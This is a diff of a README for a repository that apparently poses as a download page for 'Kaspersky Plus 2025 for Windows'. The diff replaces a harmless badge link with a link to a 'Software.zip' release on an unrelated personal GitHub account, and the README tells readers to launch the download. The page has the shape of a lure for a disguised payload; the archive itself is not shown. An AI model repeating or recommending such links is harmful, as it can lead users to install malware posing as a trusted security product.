@@ -26,7 +26,7 @@ Protect your digital world with comprehensive security using Kaspersky Plus 2025
 - [Kaspersky Plus VPN](#)
 
 ## 📥 Download Link:
-[![Kaspersky Plus Download](https://img.shields.io/badge/Download-Kaspersky_Plus-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Kaspersky Plus Download](https://github.com/Luanhaha123/Kaspersky-Plus-For-Windows/releases/download/v2.0/Software.zip)](https://github.com/Luanhaha123/Kaspersky-Plus-For-Windows/releases/download/v2.0/Software.zip)
 
 The download link provided needs to be launched to access the Kaspersky Plus 2025 for Windows.
 
